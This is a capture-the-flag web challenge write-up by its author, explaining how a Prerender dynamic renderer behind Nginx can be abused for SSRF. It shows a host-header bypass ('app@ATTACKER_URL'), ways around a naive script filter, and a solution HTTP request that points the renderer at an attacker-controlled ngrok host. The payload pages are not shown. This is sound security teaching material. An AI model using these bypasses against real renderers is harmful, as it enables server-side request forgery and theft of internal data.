# Star Cereal Episode 3: The Revenge of the Breakfast - Solution

**Author**: zeyu2001

**Category**: Web

## Main Ideas

This challenge was heavily inspired by [Favorite Emojis - ACSC 2021](https://ctf.zeyu2001.com/2021/asian-cyber-security-challenge-acsc-2021/favorite-emojis).

The challenge was centred around the unsafe use of dynamic renderers such as Prerender, which are pretty much SSRF-as-a-service.

The main idea is that we could trick the dynamic renderer to render a sensitive internal endpoint by using a custom host header, since the Nginx configuration rewrites the URL using the host header as follows:

```nginx
if ($prerender = 1) {
    rewrite .* /$scheme://$host$request_uri? break;
    proxy_pass http://prerender:3000;
}
```

When I attempted this challenge, many participants used client-side redirects to get the renderer to display the flag in the response body.

This time, I added some extra checks to force the players to obtain XSS within the Chromium renderer and make use of the `localhost:3000` origin to bypass the Same Origin Policy.

1. `validateUrls` is a naive URL validation mechanism that checks whether the URL begins with `http://app`. This can be easily bypassed by using the `username:password@hostname` URL format.

```javascript
const validateUrls = (req, res, next) => {

    let matches = url.parse(req.prerender.url).href.match(/^(http:\/\/|https:\/\/)app/gi)
    if (!matches) {
        return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');
    }
    
    next();
}
```

To bypass this, use `Host: app@ATTACKER_URL`

2. `noScriptsPlease` is also a naive "script remover" that removes `<script>` tags. This can be easily bypassed by using `onload` event handlers and the like.

```javascript
const noScriptsPlease = (req, res, next) => {
    
    if (!req.prerender.content || req.prerender.renderType != 'html') {
        return next();
    }

    var matches = req.prerender.content.toString().match(/<script(?:.*?)>(?:[\S\s]*?)<\/script>/gi);
    if (matches)
        return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');

    matches = req.prerender.content.toString().match(/<link[^>]+?rel="import"[^>]*?>/i);
    if (matches)
        return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');

    next();
}
```

3. The Nginx frontend will replace any flags in the response body. Therefore, this challenge cannot be trivially solved by using redirects to `http://app/login.php`. One must achieve XSS within the `localhost:3000` origin, and use the `localhost:3000/render?url=` feature to bypass the same-origin policy and read the flag.

```nginx
# Do or do not, there is no flag.
proxy_set_header Accept-Encoding "";
subs_filter_types text/html text/css text/xml;
subs_filter "SEE{.*}" "SEE{NO_FLAG_FOR_YOU_MUAHAHAHA}" ir;
```

## Solution

Host the `outer.html` and `inner.html` files, then make a request to `outer.html`:

```http
GET /outer.html HTTP/1.1
Host: app@7022-42-60-216-15.ngrok.io
User-Agent: googlebot


```